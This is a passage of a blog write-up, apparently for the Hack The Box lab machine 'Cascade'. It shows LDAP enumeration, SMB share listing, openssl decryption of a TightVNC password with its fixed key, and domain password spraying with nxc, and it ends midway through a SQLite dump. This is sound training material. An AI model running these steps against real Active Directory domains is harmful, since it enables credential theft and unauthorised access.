<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Cascade (Windows Medium) | SidePieceVillage</title><meta name="author" content="Jay"><meta name="copyright" content="Jay"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Cascade is a medium Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for..."><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Cascade (Windows Medium)",
  "url": "https://d34db33fb04h.github.io/2025/03/05/Cascade/",
  "image": "https://d34db33fb04h.github.io/img/cascade.png",
  "datePublished": "2025-03-05T20:03:31.000Z",
  "dateModified": "2025-04-07T14:53:03.348Z",
  "author": [
    {
      "@type": "Person",
      "name": "Jay",
      "url": "https://d34db33fb04h.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/j-neon-oval.png"><link rel="canonical" href="https://d34db33fb04h.github.io/2025/03/05/Cascade/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Cascade (Windows Medium)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/hacking-crook.gif" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/chains/"><i class="fa-fw fas fa-chain"></i><span> Chains</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/n8.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/j-neon-oval.png" alt="Logo"><span class="site-name">SidePieceVillage</span></a><a class="nav-page-title" href="/"><span class="site-name">Cascade (Windows Medium)</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fas fa-user"></i><span> whoami</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Categories</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/htb/"><i class="fa-fw fa-solid fa-cube"></i><span> HTB</span></a></li><li><a class="site-page child" href="/categories/vl/"><i class="fa-fw fas fa-building"></i><span> Vunlab</span></a></li><li><a class="site-page child" href="/categories/chains/"><i class="fa-fw fas fa-chain"></i><span> Chains</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> Nav</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Cascade (Windows Medium)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-03-05T20:03:31.000Z" title="Created 2025-03-05 14:03:31">2025-03-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-04-07T14:53:03.348Z" title="Updated 2025-04-07 09:53:03">2025-04-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/htb/">htb</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>Cascade is a medium Windows machine configured as a Domain Controller. LDAP anonymous binds are enabled, and enumeration yields the password for user <code>r.thompson</code>, which gives access to a <code>TightVNC</code> registry backup. The backup is decrypted to gain the password for <code>s.smith</code>. This user has access to a .NET executable, which after decompilation and source code analysis reveals the password for the <code>ArkSvc</code> account. This account belongs to the <code>AD Recycle Bin</code> group, and is able to view deleted Active Directory objects. One of the deleted user accounts is found to contain a hardcoded password, which can be reused to login as the primary domain administrator. </p>
<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)</span><br><span class="line">| dns-nsid:</span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-05 15:34:05Z)</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">636/tcp   open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped    syn-ack ttl 127</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>

<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>Checking if Anonymous LDAP binding is enabled.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ldapsearch -x -H ldap://10.10.10.182 -b &quot;DC=cascade,DC=local&quot; &#x27;(objectClass=person)&#x27;</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">name: Ryan Thompson</span><br><span class="line">objectGUID:: LfpD6qngUkupEy9bFXBBjA==</span><br><span class="line">userAccountControl: 66048</span><br><span class="line">badPwdCount: 2</span><br><span class="line">codePage: 0</span><br><span class="line">countryCode: 0</span><br><span class="line">badPasswordTime: 133856782280227955</span><br><span class="line">lastLogoff: 0</span><br><span class="line">lastLogon: 133856660661946343</span><br><span class="line">pwdLastSet: 132230718862636251</span><br><span class="line">primaryGroupID: 513</span><br><span class="line">objectSid:: AQUAAAAAAAUVAAAAMvuhxgsd8Uf1yHJFVQQAAA==</span><br><span class="line">accountExpires: 9223372036854775807</span><br><span class="line">logonCount: 2</span><br><span class="line">sAMAccountName: r.thompson</span><br><span class="line">sAMAccountType: 805306368</span><br><span class="line">userPrincipalName: r.thompson@cascade.local</span><br><span class="line">objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=cascade,DC=local</span><br><span class="line">dSCorePropagationData: 20200126183918.0Z</span><br><span class="line">dSCorePropagationData: 20200119174753.0Z</span><br><span class="line">dSCorePropagationData: 20200119174719.0Z</span><br><span class="line">dSCorePropagationData: 20200119174508.0Z</span><br><span class="line">dSCorePropagationData: 16010101000000.0Z</span><br><span class="line">lastLogonTimestamp: 133856660661946343</span><br><span class="line">msDS-SupportedEncryptionTypes: 0</span><br><span class="line">cascadeLegacyPwd: &lt;SNIP&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>This reveals a <code>cascadeLegacyPwd</code> for <code>r.thompson</code>. We can use <code>base64</code> to decode this perhaps.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ echo &lt;SNIP&gt; | base64 -d</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>We can try <code>r.thompson</code> and the password we have to see what shares are available.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.10.182 -u r.thompson -p &lt;SNIP&gt; --shares</span><br><span class="line"></span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\r.thompson:&lt;SNIP&gt;</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         [*] Enumerated shares</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         Share           Permissions     Remark</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         -----           -----------     ------</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         ADMIN$                          Remote Admin</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         Audit$</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         C$                              Default share</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         Data            READ</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         IPC$                            Remote IPC</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         NETLOGON        READ            Logon server share</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         print$          READ            Printer Drivers</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>
<p>Getting a mix on tools and using <code>smbmap</code> we see whats in the Data share.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.182 -u r.thompson -p &lt;SNIP&gt; -R Data</span><br><span class="line">[+] IP: 10.10.10.182:445	Name: casc-dc1</span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	Data                                              	READ ONLY	</span><br><span class="line">	.\Data\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 16:05:51 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 16:05:51 2020	..</span><br><span class="line">	dr--r--r--                0 Sun Jan 12 19:45:14 2020	Contractors</span><br><span class="line">	dr--r--r--                0 Sun Jan 12 19:45:10 2020	Finance</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 12:04:51 2020	IT</span><br><span class="line">	dr--r--r--                0 Sun Jan 12 19:45:20 2020	Production</span><br><span class="line">	dr--r--r--                0 Sun Jan 12 19:45:16 2020	Temps</span><br><span class="line">	.\Data\IT\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 12:04:51 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 12:04:51 2020	..</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 12:00:30 2020	Email Archives</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 12:04:51 2020	LogonAudit</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:53:04 2020	Logs</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 16:06:59 2020	Temp</span><br><span class="line">	.\Data\IT\Email Archives\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 12:00:30 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 12:00:30 2020	..</span><br><span class="line">	fr--r--r--             2522 Tue Jan 28 12:00:30 2020	Meeting_Notes_June_2018.html</span><br><span class="line">	.\Data\IT\Logs\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:53:04 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:53:04 2020	..</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:53:04 2020	Ark AD Recycle Bin</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:56:00 2020	DCs</span><br><span class="line">	.\Data\IT\Logs\Ark AD Recycle Bin\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:53:04 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:53:04 2020	..</span><br><span class="line">	fr--r--r--             1303 Tue Jan 28 19:19:11 2020	ArkAdRecycleBin.log</span><br><span class="line">	.\Data\IT\Logs\DCs\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:56:00 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 18:56:00 2020	..</span><br><span class="line">	fr--r--r--             5967 Sun Jan 26 16:22:05 2020	dcdiag.log</span><br><span class="line">	.\Data\IT\Temp\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 16:06:59 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 16:06:59 2020	..</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 16:06:55 2020	r.thompson</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:00:05 2020	s.smith</span><br><span class="line">	.\Data\IT\Temp\s.smith\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:00:05 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:00:05 2020	..</span><br><span class="line">	fr--r--r--             2680 Tue Jan 28 14:00:01 2020	VNC Install.reg</span><br></pre></td></tr></table></figure>

<h2 id="VNC-Registry-File"><a href="#VNC-Registry-File" class="headerlink" title="VNC Registry File"></a>VNC Registry File</h2><p>The <code>VNC Install.reg</code> was the only thing that held any real data we could use. After downloading it and opening it we see a password in hex for TightVNC.<br><img src="/img/reg.png"></p>
<p>Using a little trick I found on github for <a target="_blank" rel="noopener" href="https://github.com/billchaison/VNCDecrypt">VNCDecrypt</a>, I can decrpyt this hex password.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d | hexdump -Cv</span><br><span class="line">00000000  73 54 33 33 33 76 65 32                           |&lt;SNIP&gt;|</span><br><span class="line">00000008</span><br></pre></td></tr></table></figure>

<h2 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h2><p>After getting this password, we try to spray the domain and came out successful.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb 10.10.10.182 -u users.lst -p &lt;SNIP&gt;</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\CascGuest:&lt;SNIP&gt; STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         [-] cascade.local\arksvc:&lt;SNIP&gt; STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.10.182    445    CASC-DC1         [+] cascade.local\s.smith:&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>
<p>We got a hit on <code>s.smith</code>, so we can see what else they might have access to via <code>SMB</code>.</p>
<p><img src="/img/smith.gif"></p>
<h2 id="SMasHing-SMB-with-s-smith"><a href="#SMasHing-SMB-with-s-smith" class="headerlink" title="SMasHing SMB with s.smith"></a>SMasHing SMB with s.smith</h2><p>Looking into shares we see we have access the a Audit Share.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.182 -u s.smith -p &lt;SNIP&gt;</span><br><span class="line">[+] IP: 10.10.10.182:445	Name: casc-dc1</span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	ADMIN$                                            	NO ACCESS	Remote Admin</span><br><span class="line">	Audit$                                            	READ ONLY	</span><br><span class="line">	C$                                                	NO ACCESS	Default share</span><br><span class="line">	Data                                              	READ ONLY	</span><br><span class="line">	IPC$                                              	NO ACCESS	Remote IPC</span><br><span class="line">	NETLOGON                                          	READ ONLY	Logon server share</span><br><span class="line">	print$                                            	READ ONLY	Printer Drivers</span><br><span class="line">	SYSVOL                                            	READ ONLY	Logon server share</span><br></pre></td></tr></table></figure>
<p>Looking into this share we have a couple of files and maybe a custom <code>exe</code> file.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ smbmap -H 10.10.10.182 -u s.smith -p &lt;SNIP&gt; -R &#x27;Audit$&#x27;</span><br><span class="line">[+] IP: 10.10.10.182:445	Name: casc-dc1</span><br><span class="line">	Disk                                                  	Permissions	Comment</span><br><span class="line">	----                                                  	-----------	-------</span><br><span class="line">	Audit$                                            	READ ONLY	</span><br><span class="line">	.\Audit$\*</span><br><span class="line">	dr--r--r--                0 Wed Jan 29 12:01:26 2020	.</span><br><span class="line">	dr--r--r--                0 Wed Jan 29 12:01:26 2020	..</span><br><span class="line">	fr--r--r--            13312 Tue Jan 28 15:47:08 2020	CascAudit.exe</span><br><span class="line">	fr--r--r--            12288 Wed Jan 29 12:01:26 2020	CascCrypto.dll</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 15:43:18 2020	DB</span><br><span class="line">	fr--r--r--               45 Tue Jan 28 17:29:47 2020	RunAudit.bat</span><br><span class="line">	fr--r--r--           363520 Tue Jan 28 14:42:18 2020	System.Data.SQLite.dll</span><br><span class="line">	fr--r--r--           186880 Tue Jan 28 14:42:18 2020	System.Data.SQLite.EF6.dll</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x64</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:42:18 2020	x86</span><br><span class="line">	.\Audit$\DB\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 15:43:18 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 15:43:18 2020	..</span><br><span class="line">	fr--r--r--            24576 Tue Jan 28 15:43:18 2020	Audit.db</span><br><span class="line">	.\Audit$\x64\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..</span><br><span class="line">	fr--r--r--          1639936 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll</span><br><span class="line">	.\Audit$\x86\*</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:42:18 2020	.</span><br><span class="line">	dr--r--r--                0 Tue Jan 28 14:42:18 2020	..</span><br><span class="line">	fr--r--r--          1246720 Tue Jan 28 14:42:18 2020	SQLite.Interop.dll</span><br></pre></td></tr></table></figure>

<h2 id="Source-Code-Analysis"><a href="#Source-Code-Analysis" class="headerlink" title="Source Code Analysis"></a>Source Code Analysis</h2><p>We can download <code>CascAudit.exe</code> and see what thats about. We get it to our Windows VM and open it in <code>dnSpy</code>, and look at the MainModule.<br><img src="/img/sqlitecasc.png"></p>
<p>This shows us a part of the executable that uses sqlite to create an account over LDAP, I suppose. As well as a function <code>Crypto</code> that wasn’t mentioned in the code. So it must be in a <code>dll</code> on the share. Guess we’ll go find more in the Audit Share. We can grab the <code>CascCrypto.dll</code> and <code>Audit.db</code> and check these out. </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># Audit.db</span><br><span class="line"></span><br><span class="line">$ sqlite3 10.10.10.182-Audit_DB_Audit.db &#x27;.dump&#x27;\</span><br><span class="line">PRAGMA foreign_keys=OFF;</span><br><span class="line">BEGIN TRANSACTION;</span><br><span class="line">CREATE TABLE IF NOT EXISTS &quot;Ldap&quot; (</span><br><span class="line">	&quot;Id&quot;	INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">	&quot;uname&quot;	TEXT,</span><br><span class="line">	&quot;pwd&quot;	TEXT,</span><br><span class="line">	&quot;domain&quot;	TEXT</span><br><span class="line">);</span><br><span class="line">INSERT INTO Ldap 